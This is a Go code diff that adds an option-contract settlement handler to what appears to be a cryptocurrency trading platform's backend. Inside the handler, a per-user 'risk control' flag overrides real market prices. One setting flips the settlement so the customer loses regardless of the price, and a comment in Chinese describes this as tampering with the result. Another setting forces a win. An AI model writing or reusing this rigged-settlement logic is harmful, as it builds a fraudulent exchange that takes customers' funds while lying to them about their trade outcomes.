@@ -11,6 +11,7 @@ import (
 	"goapi/pkg/agent_dividend"
 	"goapi/pkg/echo"
 	"goapi/pkg/helpers"
+	"goapi/pkg/huobi"
 	"goapi/pkg/logger"
 	"goapi/pkg/mysql"
 	"goapi/pkg/redis"
@@ -267,4 +268,151 @@ func (h *OptionContractController) TradeHandler(c *gin.Context) {
 
 	DB.Commit()
 	echo.Success(c, addData, "ok", "")
+}
+
+// LiquidationHandler 期权合约-平仓
+func (h *OptionContractController) LiquidationHandler(c *gin.Context) {
+	var params requests.OptionContractTransactionLiquidation
+	_ = c.Bind(&params) // 数据验证
+	vErr := validator.Validate.Struct(params)
+	if vErr != nil {
+		msg := validator.Lang(c.Request.Header.Get("Language")).Translate(vErr, params, c.Request.Header.Get("Language"))
+		echo.Error(c, "ValidatorError", msg)
+		return
+	}
+	userInfo, _ := c.Get("user")
+	var result response.OptionTransactionKline
+	DB := mysql.DB.Begin().Debug()
+	DB.Model(models.OptionContractTransaction{}).
+		Where(models.Prefix("$_option_contract_transaction.id"), params.Id).
+		Where(models.Prefix("$_option_contract_transaction.email"), userInfo.(map[string]interface{})["email"]).
+		Where(models.Prefix("$_option_contract_transaction.status"), "0").
+		Joins(models.Prefix("left join $_currency on $_option_contract_transaction.currency_id=$_currency.id")).
+		Select(models.Prefix("$_option_contract_transaction.*,$_currency.k_line_code")).
+		Find(&result)
+	if result.Id <= 0 {
+		DB.Rollback()
+		echo.Error(c, "ValidatorError", "id error")
+		return
+	}
+	if result.Status > 0 {
+		DB.Rollback()
+		logger.Error(errors.New("该订单已确认"))
+		echo.Error(c, "ValidatorError", "")
+		return
+	}
+
+	clinchPrice, err1 := huobi.Kline(result.KLineCode)
+	Updates := cmap.New().Items()
+	Updates["clinch_price"] = clinchPrice // 成交价格
+	if err1 != nil {
+		DB.Rollback()
+		logger.Error(errors.New(fmt.Sprintf("获取本阶段收盘价失败: %v", err1.Error())))
+		echo.Error(c, "OperationFailed", "")
+		return
+	}
+	logger.Info(fmt.Sprintf("获取本阶段收盘价: %v", clinchPrice))
+	BuyPrice, err2 := strconv.ParseFloat(result.BuyPrice, 64)
+	if err2 != nil {
+		DB.Rollback()
+		logger.Error(errors.New(fmt.Sprintf("字符串转float64失败: %v", err2.Error())))
+		echo.Error(c, "OperationFailed", "")
+		return
+	}
+	// 更新交割结果
+	Updates["status"] = "1"
+	// 计算交割结果
+	// 涨：收盘价大于开盘价
+	logger.Info("clinchPrice > BuyPrice")
+	if clinchPrice > BuyPrice {
+		logger.Info(fmt.Sprintf("%v > %v ：涨", clinchPrice, BuyPrice))
+		Updates["order_result"] = "1"
+	} else {
+		logger.Info(fmt.Sprintf("%v > %v ：跌", clinchPrice, BuyPrice))
+		// 跌：收盘价小于开盘价
+		Updates["order_result"] = "2"
+	}
+
+	// 根据风控来交易，不看k线图结果
+	var User response.User
+	DB.Model(models.User{}).Where("id", result.UserId).Find(&User)
+	// User.RiskProfit 风控 0-无 1-盈 2-亏  根据风控来交易，不看k线图结果   ||    购买结果和实际结果一样 盈利了
+	// 盈利：本金+（本金*盈利率）-手续费 handle_fee
+	if User.RiskProfit == 2 { // 根据风控概率直接让用户输，篡改交割结果改成和用户买的不一样
+		if result.OrderType == Updates["order_result"] {
+			if Updates["order_result"] == "1" {
+				Updates["order_result"] = "2"
+			} else {
+				Updates["order_result"] = "1"
+			}
+			// 最终盈利
+			Updates["result_profit"] = 0
+		}
+	} else {
+		if User.RiskProfit == 1 || result.OrderType == Updates["order_result"] {
+			if User.RiskProfit == 1 {
+				Updates["order_result"] = "1"
+				logger.Info(fmt.Sprintf("根据风控概率赢了 User.RiskProfit : %v", User.RiskProfit))
+				logger.Info(fmt.Sprintf("风控盈利更新交割结果 : %v", Updates))
+			}
+			Profit := result.Price + (result.Price * result.ProfitRatio / 100) - (result.Price * result.HandleFee / 100)
+			logger.Info(fmt.Sprintf("%v + (%v * %v) - (%v * %v)", result.Price, result.Price, result.ProfitRatio/100, result.Price, result.HandleFee/100))
+			logger.Info(fmt.Sprintf("最终盈利 : %v", Profit))
+			Updates["result_profit"] = Profit
+
+			// 查询用户当前钱包余额
+			where := cmap.New().Items()
+			where["user_id"] = result.UserId
+			where["trading_pair_id"] = result.TradingPairId
+			var UsersWallet response.UsersWallet
+			DB.Model(models.UsersWallet{}).Where(where).Find(&UsersWallet)
+			// 查询用户当前钱包余额
+
+			// 修改钱包余额
+			UpdateUsersWallet := cmap.New().Items()
+			UpdateUsersWallet["available"] = UsersWallet.Available + Profit
+			editError := DB.Model(models.UsersWallet{}).Where(where).Updates(UpdateUsersWallet).Error
+			if editError != nil {
+				logger.Error(errors.New(fmt.Sprintf("修改钱包余额失败 : %v", editError.Error())))
+				DB.Rollback()
+				echo.Error(c, "OperationFailed", "")
+				return
+			}
+			// 修改钱包余额
+
+			// 创建钱包流水
+			var data models.WalletStream
+			data.Way = "1"                                                 // 流转方式 1 收入 2 支出
+			data.Type = "7"                                                // 流转类型 0 未知 1 充值 2 提现 3 划转 4 快捷买币 5 空投 6 现货 7 合约 8 期权 9 手续费
+			data.TypeDetail = "11"                                         // 流转详细类型 0 未知 1 USDT充值 2银行卡充值 3现货划转合约 4合约划转现货 5提现 6空投支出 7空投收入 8现货支出 9现货收入 10合约支出 11合约收入 12期权支出 13期权收入
+			data.UserId = result.UserId                                    // 用户id
+			data.Email = result.Email                                      // 用户邮箱
+			data.TradingPairId = helpers.StringToInt(result.TradingPairId) // 交易对id
+			data.TradingPairName = result.TradingPairName                  // 交易对名称
+			data.Amount = fmt.Sprintf("%v", Profit)                        // 流转金额
+			data.AmountBefore = UsersWallet.Available                      // 流转前的余额
+			data.AmountAfter = Profit + UsersWallet.Available              // 流转后的余额
+			cErr := DB.Model(models.WalletStream{}).Create(&data).Error
+			if cErr != nil {
+				logger.Error(errors.New(fmt.Sprintf("创建钱包流水失败 : %v", cErr.Error())))
+				DB.Rollback()
+				echo.Error(c, "OperationFailed", "")
+				return
+			}
+			// 创建钱包流水
+		}
+		logger.Info("clinchPrice > BuyPrice")
+	}
+	err3 := DB.Model(models.OptionContractTransaction{}).
+		Where("id", params.Id).
+		Updates(Updates).Error
+	if err3 != nil {
+		logger.Error(errors.New(fmt.Sprintf("更新交割结果失败 : %v", err3.Error())))
+		DB.Rollback()
+		echo.Error(c, "OperationFailed", "")
+		return
+	}
+	DB.Commit()
+	echo.Success(c, "", "", "")
+
 }
